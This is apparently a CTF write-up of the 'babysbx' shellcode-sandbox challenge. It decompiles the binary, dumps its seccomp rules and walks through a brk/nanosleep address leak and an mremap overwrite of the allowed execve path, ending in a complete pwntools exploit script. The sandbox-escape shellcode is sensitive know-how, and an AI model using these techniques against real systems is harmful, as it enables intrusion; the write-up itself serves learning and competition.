---
layout: post
current: post
cover:  assets/blackhatmea/zerodaytea/cover.webp
navigation: True
title: "babysbx"
date: 2023-11-23 02:00:00
tags: [BlackhatMEA, pwn]
class: post-template
subclass: 'post'
author: ZeroDayTea
---

Shellcode sandboxes make for a fun little game.

## Looking at the Problem

We're provided with a binary `babysbx`, a second binary ``readflag``, as well as a `Dockerfile` and `docker-compose.yml` for testing our remote exploit. Let's begin by looking at what the binary is doing to figure out what's going on.

## Decomp

Popping the binary into our favorite decompiler (I'm using Ghidra for this writeup), we find a main method that looks like this:
```c
undefined8 main(void)

{
  code *__dest;
  ssize_t sVar1;
  ulong local_18;
  
  __dest = (code *)mmap((void *)0xc0de000,0x1000,7,0x22,-1,0);
  memcpy(__dest,prefix,0x28);
  write(1,"shellcode: ",0xb);
  local_18 = 0;
  while ((local_18 < 0xfd8 && (sVar1 = read(0,__dest + local_18 + 0x28,1), 0 < sVar1))) {
    local_18 = local_18 + 1;
  }
  install_sandbox();
  (*__dest)();
  return 0;
}
```

Looks like this is designating a segment of memory for us with `mmap`, writing our input into that segment of memory (`0xfd7` bytes), and finally executing our input. This means any shellcode we send to the program will get successfully executed. Before it's executed, however, there's an `install_sandbox()` function that gets run. Let's take a look at that now.

```c
void install_sandbox(void)

{
  int iVar1;
  long lVar2;
  undefined8 in_R8;
  undefined8 in_R9;
  
  lVar2 = seccomp_init(0x7fff0000);
  if (lVar2 == 0) {
    fatal("seccomp_init");
  }
  iVar1 = seccomp_rule_add(lVar2,0,2,0);
  if (iVar1 == 0) {
    iVar1 = seccomp_rule_add(lVar2,0,0x101,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x1b5,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x55,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x65,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x38,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x1b3,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x39,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x3a,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x3e,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x142,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,9,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,10,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0xb,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x11,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x13,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x127,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x147,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x136,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x137,0);
    if (iVar1 != 0) goto LAB_0010162a;
  }
  else {
LAB_0010162a:
    fatal("seccomp_rule_add");
  }
  iVar1 = seccomp_rule_add(lVar2,0,0x3b,1,in_R8,in_R9,0x100000000,"/bin/id",0);
  if (iVar1 == 0) {
    iVar1 = seccomp_rule_add(lVar2,0,0,1,in_R8,in_R9,0x100000002,1,0);
    if (iVar1 == 0) {
      iVar1 = seccomp_rule_add(lVar2,0,0,1,in_R8,in_R9,0x200000001,0xc0de000,0);
      if (iVar1 == 0) {
        iVar1 = seccomp_rule_add(lVar2,0,0,1,in_R8,in_R9,0x500000001,0xc0df000,0);
        if (iVar1 == 0) goto LAB_001017e4;
      }
    }
  }
  fatal("seccomp_rule_add");
LAB_001017e4:
  iVar1 = seccomp_load(lVar2);
  if (iVar1 != 0) {
    fatal("seccomp_load");
  }
  seccomp_release(lVar2);
  return;
}
```

That's a lot to parse through, but it generally looks like this function is setting up a bunch of `seccomp` rules that will set limitations on which syscalls we can actually run with our shellcode. Thankfully there's a tool out there (``seccomp-tools``) that makes looking at these a lot easier. 

Let's use ``seccomp-tools`` to dump these rules:
```
shellcode:  line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x28 0xc000003e  if (A != ARCH_X86_64) goto 0042
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x25 0xffffffff  if (A != 0xffffffff) goto 0042
 0005: 0x15 0x24 0x00 0x00000002  if (A == open) goto 0042
 0006: 0x15 0x23 0x00 0x00000009  if (A == mmap) goto 0042
 0007: 0x15 0x22 0x00 0x0000000a  if (A == mprotect) goto 0042
 0008: 0x15 0x21 0x00 0x0000000b  if (A == munmap) goto 0042
 0009: 0x15 0x20 0x00 0x00000011  if (A == pread64) goto 0042
 0010: 0x15 0x1f 0x00 0x00000013  if (A == readv) goto 0042
 0011: 0x15 0x1e 0x00 0x00000038  if (A == clone) goto 0042
 0012: 0x15 0x1d 0x00 0x00000039  if (A == fork) goto 0042
 0013: 0x15 0x1c 0x00 0x0000003a  if (A == vfork) goto 0042
 0014: 0x15 0x1b 0x00 0x0000003e  if (A == kill) goto 0042
 0015: 0x15 0x1a 0x00 0x00000055  if (A == creat) goto 0042
 0016: 0x15 0x19 0x00 0x00000065  if (A == ptrace) goto 0042
 0017: 0x15 0x18 0x00 0x00000101  if (A == openat) goto 0042
 0018: 0x15 0x17 0x00 0x00000127  if (A == preadv) goto 0042
 0019: 0x15 0x16 0x00 0x00000136  if (A == process_vm_readv) goto 0042
 0020: 0x15 0x15 0x00 0x00000137  if (A == process_vm_writev) goto 0042
 0021: 0x15 0x14 0x00 0x00000142  if (A == execveat) goto 0042
 0022: 0x15 0x13 0x00 0x00000147  if (A == preadv2) goto 0042
 0023: 0x15 0x12 0x00 0x000001b3  if (A == 0x1b3) goto 0042
 0024: 0x15 0x11 0x00 0x000001b5  if (A == 0x1b5) goto 0042
 0025: 0x15 0x00 0x04 0x0000003b  if (A != execve) goto 0030
 0026: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # execve(filename, argv, envp)
 0027: 0x15 0x00 0x0e 0x0000560f  if (A != 0x560f) goto 0042
 0028: 0x20 0x00 0x00 0x00000010  A = filename # execve(filename, argv, envp)
 0029: 0x15 0x0b 0x0c 0x4c27a050  if (A == 0x4c27a050) goto 0041 else goto 0042
 0030: 0x15 0x00 0x0a 0x00000000  if (A != read) goto 0041
 0031: 0x20 0x00 0x00 0x00000024  A = count >> 32 # read(fd, buf, count)
 0032: 0x15 0x00 0x09 0x00000000  if (A != 0x0) goto 0042
 0033: 0x20 0x00 0x00 0x00000020  A = count # read(fd, buf, count)
 0034: 0x15 0x00 0x07 0x00000001  if (A != 0x1) goto 0042
 0035: 0x20 0x00 0x00 0x0000001c  A = buf >> 32 # read(fd, buf, count)
 0036: 0x25 0x05 0x00 0x00000000  if (A > 0x0) goto 0042
 0037: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0042
 0038: 0x20 0x00 0x00 0x00000018  A = buf # read(fd, buf, count)
 0039: 0x35 0x00 0x02 0x0c0de000  if (A < 0xc0de000) goto 0042
 0040: 0x35 0x01 0x00 0x0c0df000  if (A >= 0xc0df000) goto 0042
 0041: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0042: 0x06 0x00 0x00 0x00000000  return KILL
```

That's still a lot, but we see that at first a good many syscalls are blocked. Right afterwards, some restrictions are set on allowed syscalls. The blocked syscalls include `open`, `mmap`, `mprotect`, `munmap`, `pread64`, `readv`, `clone`, `fork`, `vfork`, `kill`, `creat`, `ptrace`, `openat`, `preadv`, `openat`, `preadv`, `process_vm_readv`, `process_vm_writev`, `execveat`, and `preadv2`.

The syscalls that are restricted are `execve`, where the filename of our execve call must match the one at memory address `0x560f4c27a050`, as well as `read`, where the number of bytes read must be at most 1 and the address must be between `0xc0de000` and `0xc0df000` (the memory region we control with our shellcode).

It's strange to see execve restricted in this way, so let's take a look at what actually exists at `0x560f4c27a050`. Loading up our binary in `gdb`, we can either inspect the memory there directly (we would have to run `seccomp-tools` with address randomization disabled so addresses line up), or we can run ``info variables``:
```c
0x0000555555556050  ALLOWED_EXE
```
*Note that the difference in addresses is due to address randomization. `0x560f4c27a050` and `0x555555556050` represent the same variable.*

Further inspecting:
```c
pwndbg> x/s 0x0000555555556050
0x555555556050 <ALLOWED_EXE>:	"/bin/id"
```
Looks like the filename for our execve syscall is being compared to a string in a global variable called `ALLOWED_EXE` stored in the bss segment of memory. It's currently set to `"/bin/id"`, so we can only call `/bin/id`. However, if we could somehow control this variable, we could set it to anything we wanted, like `"/bin/sh"` or `"/readflag"` to run the flag binary we were also provided.

## Setting up an Exploit

At first I tried to just get some simple shellcode going to run `/bin/id`, which we should be able to do without any exploit. Quite noticeably, however, all the registers have been reset:
![reset_registers](/assets/blackhatmea/zerodaytea/reset_registers.webp)
*You can see this for yourself if you just send 0xfd7 bytes of anything and inspect in GDB.*

Any `PUSH` instruction we try will fail because there's no stack frame set up with `RSP` and `RBP`. For our initial setup code, we can start by creating a stack within the memory region that was allocated for us by setting `RBP` and `RSP` to some values with a couple of bytes in between for our stack.
```python
from pwn import *

elf = ELF("./babysbx")
context.binary = elf

def conn():
    if args.GDB:
        script = """
        b *(main+201)
        c
        """
        p = gdb.debug(elf.path, gdbscript=script)
    elif args.REMOTE:
        p = remote("addr", 1337)
    else:
        p = process(elf.path)
    return p

def run():
    setup_stack = """
    movabs rbp, 0xc0def00
    sub rbp, 0x38
    mov rsp, rbp
    """
    shellcode = asm(setup_stack)
	p = conn()

    p.recvuntil(b'shellcode: ')

    payload = shellcode.ljust(0xfd7, b'\x90')

    p.sendline(payload)
    p.interactive()
```

We also have to make sure to use `ljust` to pad our payload to the desired length before sending it. Otherwise, the buffer will expect more bytes and nothing will get executed. This will get us going for any starter shellcode we want to write.

## Exploit Ideation

It looks like we need to find the address of the variable controlling our allowed filename for execve and find a way to overwrite the string that is currently there. You might be thinking that we already have the address from earlier, but PIE is enabled so we can't rely on any hardcoded addresses.
```bash
$ checksec ./babysbx
[*] '/BlackhatMEAFinals/pwn/babysbx_pwn/babysbx'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Looks like our exploit is now going to have to look like this:
1. Leak PIE
2. Find a way to write to the bss
3. Use execve to call a binary of our choosing

## Leaking PIE

There's the easy way to do this... and then there's the way I did it. I'll still show my way first before discussing the method that a couple other competitors used.

We've got a lot of restricted syscalls, so any regular way of leaking PIE to get ELF base is not going to work. Thankfully there's this neat trick I found in a writeup from a while ago. We'll need to use `brk` and `nanosleep` which thankfully for us are unrestricted.

You might be thinking... `nanosleep`?? Yes, in fact, `nanosleep` can take an address, and if it's a valid mapped address will set `rax` to `0xffffffffffffffea`, but if it's an invalid address will set it to `0xfffffffffffffff2`. On top of that, a `brk` syscall -- which resizes the data segment (really just the BSS, data, and heap collectively together) -- will give us the address of the program break after executing. 

Together, we can use `brk` to get the end of the data segment and use `nanosleep` to bruteforce addresses downwards until we hit a known address. Then, we simply subtract the offset from ELF base and we've successfully broken PIE.

```python
leak_pie = """
    mov rdi, 0
    mov rax, 0xc
    syscall           <- brk syscall to get end of data segment
    
    mov rdi, rax
    sub rdi, 0x22000
    sub rdi, 0x400    <- align address
    
    loop:             <- loop until we find a valid address
    sub rdi, 0x1000
    mov rax, 0x23
    syscall
    cmp al, 0
    jne loop          <- break once we find an address and subtract the offset
    sub rdi, 0x4c00
    """
shellcode = asm(leak_pie)
```

## The Right Way To Do This

As I mentioned earlier, there's an easier way to do this for this challenge which I unfortunately overlooked while working on it.

While I said that all the registers had been reset so we didn't have any addresses left over in them, that's not entirely true. Breaking where we did earlier at the start of our shellcode, we can run `info reg all` to inspect all of the registers available.

![SSEregisters](/assets/blackhatmea/zerodaytea/SSEregisters.webp)
While all the main registers have been reset, the SSE registers that libc uses for SIMD optimization (such as `xxm0`, `ymm0`, etc.) have been untouched and it looks like they contain some heap addresses. 

On top of that, seccomp rules are stored in the heap and these rules contain the address of "/bin/id" as shown earlier. With this known heap address, it's possible to iterate over and find where these rules are stored and get the address of ALLOWED EXE. Thanks to [disconnect3d](https://twitter.com/disconnect3d_pl) from justCatTheFish and [nobodyisnobody](https://twitter.com/_Nobodyisnobody) from Sand Swimmers for pointing this out to me. A good bit simpler than what I did but I still think the `brk` + `nanosleep` trick is a good one to remember for the future.
## Writing to BSS

Now that we have ELF base we know the address of the `ALLOWED_EXE` variable we're trying to control. It's time to find a way to write to it. 

`mmap`, `mprotect`, `munmap`, and `ptrace` are all blocked so we need to rely on something else to control the `"/bin/id"` string. Fortunately, `mremap`, a syscall used for moving a memory page, has been left unrestricted.

The trick here is that we can move a memory page (which we control) containing some other string to the memory page containing the `ALLOWED_EXE` variable. This way we can effectively control the contents of the data section. 

[From the `mremap` manpage](https://man7.org/linux/man-pages/man2/mremap.2.html) under the `MREMAP_DONTUNMAP` flag description: 
> This flag, which must be used in conjunction with MREMAP_MAYMOVE, remaps a mapping to a new address but does not unmap the mapping at old_address.

Thus, our goal is to run the equivalent of:
```c
mremap(our_memory, 0x1000, 0x2000);
mremap(our_memory_page (our_memory + 0x1000), 0x1000, 0x1000, MREMAP_DONTUNMAP, page_with_allowed_exe);
```

The `page_with_allowed_exe` page start is `0x50` bytes before the `ALLOWED_EXE` var we are trying to control, so we'll have to write our desired string `0x50` bytes after the start of the page we control so they align after remapping.

I first tried to do this with `"/bin/sh"`, but unfortunately `/bin/sh` itself uses restricted syscalls, so executing it would always fail. Thankfully, the challenge had a provided binary at `/readflag` which gives us the flag without using any restricted syscalls, so we just have to replace `"/bin/id"` with that.

The code for that looks like this:
```python
set_var = """
sub rdi, 0x4c00     <- get ELF base
add rdi, 0x2000     <- get memory page to control
mov rbx, rdi        <- save for later use
mov rdi, 0xc0de000
mov rsi, 0x1000
mov rdx, 0x2000
mov rax, 0x19
syscall             <- mremap(our_memory, 0x1000, 0x2000)

mov rsp, 0xc0de000 + 0x1000 + 0x50 + 0x10
mov rdi, 0x0000000000000067
push rdi
mov rdi, 0x616c66646165722f
push rdi            <- write "/readflag" to our memory page
mov rdi, rsp

sub rdi, 0x50
mov rdx, 0x1000
mov r10, 3          <- MREMAP_DONTUNMAP flag
mov r8, rbx
mov rax, 0x19
syscall             <- remap our controlled page to page of ALLOWED_EXE
"""

shellcode += asm(set_var)
```

Checking again to make sure it worked, we see that we've successfully overwritten `ALLOWED_EXE` as intended :)

![overwrite_success](/assets/blackhatmea/zerodaytea/overwrite_success.webp)
## Getting the Flag

Finally, all that's left to do is execute our execve call with the now allowed `"/readflag"` filename argument and get the flag.

```python
win = """
mov rdi, rbx     <-
add rdi, 0x50    <- setting filename to address of "/readflag"
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
"""

shellcode += asm(win)
```

## Final Exploit

Putting it all together we get our final shellcode and working exploit.
```python
from pwn import *

elf = ELF("./babysbx")
context.binary = elf

def conn():
    if args.GDB:
        script = """
        b *(main+201)
        c
        """
        p = gdb.debug(elf.path, gdbscript=script)
    elif args.REMOTE:
        p = remote("blackhat.flagyard.com", 32428)
    else:
        p = process(elf.path)
    return p

def run():
    setup_stack = """
    movabs rbp, 0xc0def00
    sub rbp, 0x38
    mov rsp, rbp
    """
    shellcode = asm(setup_stack)

    leak_pie = """
    mov rdi, 0
    mov rax, 0xc
    syscall
    
    mov rdi, rax
    sub rdi, 0x20000
    sub rdi, 0x400
    
    loop:
    sub rdi, 0x1000
    mov rax, 0x23
    syscall
    cmp al, 0
    jne loop
    """
    shellcode += asm(leak_pie)

    set_var = """
    sub rdi, 0x4c00
    add rdi, 0x2000
    mov rbx, rdi
     
    mov rdi, 0xc0de000
    mov rsi, 0x1000
    mov rdx, 0x2000
    mov rax, 0x19
    syscall

    mov rsp, 0xc0de000 + 0x1000 + 0x50 + 0x10
    mov rdi, 0x0000000000000067
    push rdi
    mov rdi, 0x616c66646165722f
    push rdi
    mov rdi, rsp

    sub rdi, 0x50
    mov rdx, 0x1000
    mov r10, 3
    mov r8, rbx
    mov rax, 0x19
    syscall
    """

    shellcode += asm(set_var)

    win = """
    mov rdi, rbx
    add rdi, 0x50
    mov rsi, 0
    mov rdx, 0
    mov rax, 0x3b
    syscall
    """

    shellcode += asm(win)

    p = conn()

    p.recvuntil(b'shellcode: ')

    payload = shellcode.ljust(0xfd7, b'\x90')

    p.sendline(payload)
    p.interactive()

run()
```

![babysbxflag](/assets/blackhatmea/zerodaytea/babysbxflag.webp)
*flag redacted on local*

Pretty fun shellcoding challenge that I ended up making a bit more difficult than necessary. The `brk` + `nanosleep` and `mremap` tricks are good ones to remember for the future though!
